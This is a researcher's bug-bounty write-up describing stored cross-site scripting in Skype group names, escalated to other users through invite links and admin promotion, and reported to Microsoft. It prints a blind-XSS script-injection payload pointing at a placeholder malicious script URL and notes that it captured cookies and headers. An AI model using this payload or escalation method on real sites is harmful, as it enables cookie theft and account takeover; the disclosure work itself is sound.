---
title: "Multiple xss in *.skype.com (2)"
author: "Jayateertha Guruprasad"
date: 2019-04-10T07:11:52.560Z
lastmod: 2024-08-31T13:11:12+05:30
type: "post"
description: ""

subtitle: ""

image: "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_0.png" 
images:
 - "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_0.png"
 - "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_1.png"
 - "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_2.png"
 - "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_3.png"
 - "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_4.png"
 - "/post/img/2019-04-10_multiple-xss-in-.skype.com-2_5.png"


aliases:
- "/multiple-xss-in-skype-com-2-18cfed39edbd"

---

> PART 2:

So If you have read the part 1, You would have seen that I found a stored-self Xss in manager.skype.com which was getting escalated in the option("make the USER as admin of group_name") as group_name was not properly sanitized there.

Here’s what I did to affect other users,You just need to create a invite link and make a user join your group.

Once ,the user joins your group ,You just need to make him as admin using the option I mentioned earlier.(requires no user interactions once he joins the group)

Once user is made as admin ,He will now see the same option called **("make the USER as admin of group_name"),** where the gropu_name was not sanitized and xss gets executed successfully on the user also!!!

![](/post/img/2019-04-10_multiple-xss-in-.skype.com-2_0.png#layoutTextWidth)

So It all ended???

No, I did more research and put a BXSS payload **```"><script src="malicious_script_url">```** in group_name.

Now add a member by sending the member a invite link.

![](/post/img/2019-04-10_multiple-xss-in-.skype.com-2_1.png#layoutTextWidth)

Once the member clicks the invite link,and accepts it , xss was getting executed in another sub domain too(**secure.skype.com**)!!!

The BXSS payload used was provided by xsshunter ,through which I was able to get user details like

screenshot of affected page,user cookies,headers,device informations,ip address etc!!!

This has hell lot of information ,which is sufficient to compromise user data and also account takeover.

![](/post/img/2019-04-10_multiple-xss-in-.skype.com-2_2.png#layoutTextWidth)![](/post/img/2019-04-10_multiple-xss-in-.skype.com-2_3.png#layoutTextWidth)

Then ,I made a final report combining all my research and sent them (secure@microsoft.com)

Finally ,I was acknowledged by Microsoft at their security researchers acknowledgement page(FEB-2019):

[https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services](https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services)

![](/post/img/2019-04-10_multiple-xss-in-.skype.com-2_4.png#layoutTextWidth)![](/post/img/2019-04-10_multiple-xss-in-.skype.com-2_5.png#layoutTextWidth)

#### **Liked my article ? Follow me on** [**LinkedIn**](https://www.linkedin.com/in/jayateerthag/)**, Twitter (**[**@jayateerthaG**](https://twitter.com/jayateerthag)**), and **[**Medium**](https://jayateerthag.medium.com/)** for more content about bugbounty, Infosec, cybersecurity and hacking.**

* * *
Written on April 10, 2019 by Jayateertha Guruprasad.

Originally published on [Medium](https://medium.com/@jayateerthag/multiple-xss-in-skype-com-2-18cfed39edbd)
